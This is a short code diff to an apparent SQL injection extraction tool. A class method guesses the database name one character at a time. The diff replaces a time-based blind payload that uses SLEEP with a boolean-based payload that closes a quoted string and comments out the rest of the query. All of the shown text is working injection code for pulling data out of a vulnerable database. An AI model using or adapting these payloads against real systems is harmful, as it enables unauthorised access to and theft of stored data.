@@ -18,7 +18,7 @@ class Extractor:
 
     def extract_char(self, position):
         for c in self.charset:
-            payload = f"1 AND IF(SUBSTRING(database(),{position},1)='{c}',SLEEP(2),0)"
+            payload = f"1' AND SUBSTRING(database(),{position},1)='{c}' #"
             if self.inf.is_true(payload):
                 return c
         return None
